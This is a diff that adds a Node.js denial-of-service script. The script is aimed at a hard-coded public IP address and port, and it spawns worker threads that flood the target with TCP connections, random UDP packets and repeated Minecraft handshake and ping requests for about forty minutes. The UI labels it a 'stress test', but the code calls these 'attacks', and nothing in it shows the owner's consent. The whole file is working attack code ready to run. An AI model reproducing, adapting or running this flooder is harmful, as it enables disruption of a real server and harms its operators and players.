@@ -1,0 +1,330 @@
+const net = require('net');
+const dgram = require('dgram');
+const crypto = require('crypto');
+const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
+const os = require('os');
+const readline = require('readline');
+
+// Config
+const TARGET_IP = '74.225.224.240';
+const TCP_PORT = 7865;
+const UDP_PORT = 7865;
+const DURATION = 120 * 20; // seconds
+
+// Enhanced performance settings pushed harder for CPU/RAM stress
+const WORKERS = Math.max(1, os.cpus().length - 1); // at least 1 worker
+const TCP_CONNS_PER_WORKER = 100; // increase connections per worker
+const UDP_SOCKETS_PER_WORKER = 10; // increase UDP sockets
+const MC_STATUS_CONNS_PER_WORKER = 1000; // increase Minecraft conns
+
+// Payload sizes inflated
+const TCP_PAYLOAD_SIZE = 65000; // 2MB TCP payload (double previous)
+const UDP_PAYLOAD_SIZE = 1472; // Max UDP without fragmentation, keep same (UDP max)
+const MC_PAYLOAD_SIZE = 4096; // 4KB Minecraft payload (increased)
+
+// Connection keep-alive duration longer, sockets stay open for entire run
+const END_TIME = Date.now() + DURATION * 1000;
+
+// --- Protocol Helpers (unchanged) ---
+function varIntBuffer(value) {
+    const bytes = [];
+    do {
+        let temp = value & 0x7F;
+        value >>>= 7;
+        if (value !== 0) temp |= 0x80;
+        bytes.push(temp);
+    } while (value !== 0);
+    return Buffer.from(bytes);
+}
+
+function writeString(str) {
+    const strBuf = Buffer.from(str, 'utf8');
+    return Buffer.concat([varIntBuffer(strBuf.length), strBuf]);
+}
+
+function prependLength(buffer) {
+    return Buffer.concat([varIntBuffer(buffer.length), buffer]);
+}
+
+function createHandshakePacket(host, port) {
+    const packetId = Buffer.from([0x00]);
+    const protocolVersion = varIntBuffer(-1);
+    const serverAddress = writeString(host);
+    const serverPort = Buffer.alloc(2);
+    serverPort.writeUInt16BE(port, 0);
+    const nextState = varIntBuffer(1);
+    return prependLength(Buffer.concat([packetId, protocolVersion, serverAddress, serverPort, nextState]));
+}
+
+function createStatusRequestPacket() {
+    return prependLength(Buffer.from([0x00]));
+}
+
+function createPingPacket() {
+    const packetId = Buffer.from([0x01]);
+    const payload = Buffer.alloc(8);
+    payload.writeBigInt64BE(BigInt(Date.now()), 0);
+    return prependLength(Buffer.concat([packetId, payload]));
+}
+
+// --- Main Thread ---
+if (isMainThread) {
+    console.clear();
+    const rl = readline.createInterface({
+        input: process.stdin,
+        output: process.stdout
+    });
+
+    let stats = {
+        startTime: Date.now(),
+        workers: [],
+        totals: {
+            tcpSent: 0, tcpErrors: 0, tcpConns: 0,
+            udpSent: 0, udpErrors: 0,
+            mcHandshakes: 0, mcStatusReqs: 0, mcPings: 0, mcErrors: 0, mcConns: 0,
+            inboundBytes: 0, outboundBytes: 0
+        }
+    };
+
+    function updateDisplay() {
+        readline.cursorTo(process.stdout, 0, 0);
+        readline.clearScreenDown(process.stdout);
+
+        const elapsed = Math.floor((Date.now() - stats.startTime) / 1000);
+        const remaining = Math.max(0, DURATION - elapsed);
+
+        console.log(`╔══════════════════════════════════════════════════════╗`);
+        console.log(`║ 🚀 ULTRA STRESS TEST - ${TARGET_IP}:${TCP_PORT} (${remaining}s remaining) ║`);
+        console.log(`╠══════════════════════════════════════════════════════╣`);
+        console.log(`║ Workers: ${WORKERS} | TCP Conns: ${stats.totals.tcpConns} | UDP Sockets: ${UDP_SOCKETS_PER_WORKER * WORKERS}`);
+        console.log(`╠══════════════════════════╦═══════════════════════════╣`);
+        console.log(`║ TCP Packets Sent: ${String(stats.totals.tcpSent).padEnd(10)} ║ UDP Packets Sent: ${String(stats.totals.udpSent).padEnd(9)} ║`);
+        console.log(`║ TCP Errors: ${String(stats.totals.tcpErrors).padEnd(15)} ║ UDP Errors: ${String(stats.totals.udpErrors).padEnd(14)} ║`);
+        console.log(`╠══════════════════════════╩═══════════════════════════╣`);
+        console.log(`║ MC Handshakes: ${stats.totals.mcHandshakes} | Status Reqs: ${stats.totals.mcStatusReqs} | Pings: ${stats.totals.mcPings}`);
+        console.log(`║ MC Errors: ${stats.totals.mcErrors} | Active Conns: ${stats.totals.mcConns}`);
+        console.log(`╠══════════════════════════════════════════════════════╣`);
+        console.log(`║ 🌐 INBOUND: ${formatBytes(stats.totals.inboundBytes)} | OUTBOUND: ${formatBytes(stats.totals.outboundBytes)}`);
+        console.log(`╚══════════════════════════════════════════════════════╝`);
+    }
+
+    function formatBytes(bytes) {
+        if (bytes >= 1073741824) return (bytes / 1073741824).toFixed(2) + ' GB';
+        if (bytes >= 1048576) return (bytes / 1048576).toFixed(2) + ' MB';
+        if (bytes >= 1024) return (bytes / 1024).toFixed(2) + ' KB';
+        return bytes + ' B';
+    }
+
+    console.log(`[+] Starting ${WORKERS} workers...`);
+    for (let i = 0; i < WORKERS; i++) {
+        const w = new Worker(__filename, {
+            workerData: {
+                targetIp: TARGET_IP,
+                tcpPort: TCP_PORT,
+                udpPort: UDP_PORT,
+                tcpConnections: TCP_CONNS_PER_WORKER,
+                udpSockets: UDP_SOCKETS_PER_WORKER,
+                mcStatusConnections: MC_STATUS_CONNS_PER_WORKER,
+                tcpPayloadSize: TCP_PAYLOAD_SIZE,
+                udpPayloadSize: UDP_PAYLOAD_SIZE,
+                mcPayloadSize: MC_PAYLOAD_SIZE,
+                endTime: END_TIME,
+            }
+        });
+
+        w.on('message', (msg) => {
+            stats.totals.tcpSent += msg.tcpSent || 0;
+            stats.totals.tcpErrors += msg.tcpErrors || 0;
+            stats.totals.tcpConns += msg.tcpConns || 0;
+            stats.totals.udpSent += msg.udpSent || 0;
+            stats.totals.udpErrors += msg.udpErrors || 0;
+            stats.totals.mcHandshakes += msg.mcHandshakes || 0;
+            stats.totals.mcStatusReqs += msg.mcStatusReqs || 0;
+            stats.totals.mcPings += msg.mcPings || 0;
+            stats.totals.mcErrors += msg.mcErrors || 0;
+            stats.totals.mcConns += msg.mcConns || 0;
+            stats.totals.inboundBytes += msg.inboundBytes || 0;
+            stats.totals.outboundBytes += msg.outboundBytes || 0;
+        });
+
+        stats.workers.push(w);
+    }
+
+    const displayInterval = setInterval(updateDisplay, 500);
+
+    setTimeout(() => {
+        clearInterval(displayInterval);
+        console.log('\n[+] Stopping all workers...');
+        stats.workers.forEach(w => w.postMessage('stop'));
+        setTimeout(() => process.exit(0), 5000);
+    }, DURATION * 1000);
+
+} else {
+    // --- Worker Thread ---
+    const {
+        targetIp, tcpPort, udpPort, tcpConnections, udpSockets, mcStatusConnections,
+        tcpPayloadSize, udpPayloadSize, mcPayloadSize, endTime
+    } = workerData;
+
+    let stop = false;
+    parentPort.on('message', msg => { if (msg === 'stop') stop = true; });
+
+    // Stats
+    const stats = {
+        tcpSent: 0, tcpErrors: 0, tcpConns: 0,
+        udpSent: 0, udpErrors: 0,
+        mcHandshakes: 0, mcStatusReqs: 0, mcPings: 0, mcErrors: 0, mcConns: 0,
+        inboundBytes: 0, outboundBytes: 0
+    };
+
+    // Pre-allocate base payloads
+    let baseTcpPayload = crypto.randomBytes(tcpPayloadSize);
+    let baseUdpPayload = crypto.randomBytes(udpPayloadSize);
+    let baseMcPayload = crypto.randomBytes(mcPayloadSize);
+
+    // Heavy CPU usage: hash payloads continuously
+    function heavyCpuHash(buffer) {
+        let hash = buffer;
+        for (let i = 0; i < 3; i++) {
+            hash = crypto.createHash('sha256').update(hash).digest();
+        }
+        return hash;
+    }
+
+    // TCP Flood: create persistent connections and continuously write heavy hashed payloads
+    function tcpFlood() {
+        if (stop || Date.now() > endTime) return;
+
+        const socket = new net.Socket();
+        socket.setTimeout(15000);
+
+        socket.on('error', () => {
+            stats.tcpErrors++;
+            socket.destroy();
+            if (!stop) setImmediate(tcpFlood);
+        });
+
+        socket.on('timeout', () => {
+            stats.tcpErrors++;
+            socket.destroy();
+            if (!stop) setImmediate(tcpFlood);
+        });
+
+        socket.on('connect', () => {
+            stats.tcpConns++;
+
+            function writeData() {
+                if (stop || !socket.writable) return;
+
+                // Hash the base payload to increase CPU usage and generate dynamic data
+                let dynamicPayload = heavyCpuHash(baseTcpPayload);
+
+                // Allocate additional buffer to stress RAM
+                crypto.randomBytes(256 * 1024); // 256KB buffer to pressure memory
+
+                // Write as many packets as socket buffer allows
+                while (socket.write(dynamicPayload)) {
+                    stats.tcpSent++;
+                    stats.outboundBytes += dynamicPayload.length;
+                }
+
+                socket.once('drain', writeData);
+            }
+
+            writeData();
+        });
+
+        socket.connect(tcpPort, targetIp);
+    }
+
+    // UDP Flood: continuously send random packets on each socket without stacking timers
+    const udpClients = Array.from({ length: udpSockets }, () => {
+        const client = dgram.createSocket('udp4');
+        client.on('error', () => stats.udpErrors++);
+        return client;
+    });
+
+    function udpFlood() {
+        if (stop || Date.now() > endTime) return;
+
+        udpClients.forEach(client => {
+            const dynamicUdpPayload = crypto.randomBytes(udpPayloadSize);
+            client.send(dynamicUdpPayload, udpPort, targetIp, (err) => {
+                if (err) stats.udpErrors++;
+                else {
+                    stats.udpSent++;
+                    stats.outboundBytes += dynamicUdpPayload.length;
+                }
+                if (!stop) setImmediate(udpFlood);
+            });
+        });
+    }
+
+    // Minecraft Flood: persistent connection sending handshake, status request, then ping repeatedly
+    function mcFlood() {
+        if (stop || Date.now() > endTime) return;
+
+        const socket = new net.Socket();
+        socket.setTimeout(15000);
+
+        socket.on('error', () => {
+            stats.mcErrors++;
+            socket.destroy();
+            if (!stop) setTimeout(mcFlood, 10);
+        });
+
+        socket.on('timeout', () => {
+            stats.mcErrors++;
+            socket.destroy();
+            if (!stop) setTimeout(mcFlood, 10);
+        });
+
+        socket.on('connect', () => {
+            stats.mcConns++;
+            try {
+                const handshake = createHandshakePacket(targetIp, tcpPort);
+                const statusReq = createStatusRequestPacket();
+                socket.write(handshake);
+                socket.write(statusReq);
+                stats.mcHandshakes++;
+                stats.mcStatusReqs++;
+                stats.outboundBytes += handshake.length + statusReq.length;
+            } catch {
+                socket.destroy();
+            }
+        });
+
+        socket.on('data', (data) => {
+            stats.inboundBytes += data.length;
+            try {
+                const ping = createPingPacket();
+                socket.write(ping);
+                stats.mcPings++;
+                stats.outboundBytes += ping.length;
+            } catch {
+                socket.destroy();
+            }
+        });
+
+        socket.connect(tcpPort, targetIp);
+    }
+
+    // Start attacks
+    for (let i = 0; i < tcpConnections; i++) tcpFlood();
+    for (let i = 0; i < udpSockets; i++) udpFlood();
+    for (let i = 0; i < mcStatusConnections; i++) mcFlood();
+
+    // Report stats every second
+    setInterval(() => {
+        parentPort.postMessage(stats);
+
+        // Reset incremental counters
+        stats.tcpSent = 0;
+        stats.udpSent = 0;
+        stats.mcHandshakes = 0;
+        stats.mcStatusReqs = 0;
+        stats.mcPings = 0;
+        stats.inboundBytes = 0;
+        stats.outboundBytes = 0;
+    }, 1000);
+}
